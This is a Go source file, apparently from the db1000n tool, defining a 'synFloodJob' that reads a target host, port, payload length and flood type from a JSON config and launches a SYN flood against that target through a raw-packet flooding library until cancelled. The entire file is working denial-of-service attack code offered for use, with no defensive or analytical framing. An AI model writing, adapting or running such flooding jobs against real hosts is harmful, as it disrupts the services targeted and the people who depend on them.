package jobs

import (
	"context"
	"encoding/json"
	"log"

	"github.com/Arriven/db1000n/src/synfloodraw"
	"github.com/Arriven/db1000n/src/utils"
)

func synFloodJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	type synFloodJobConfig struct {
		BasicJobConfig
		Host          string
		Port          int
		PayloadLength int    `json:"payload_len"`
		FloodType     string `json:"flood_type"`
	}

	var jobConfig synFloodJobConfig
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		return err
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()

	if debug {
		log.Printf("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v",
			jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
	}

	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
}
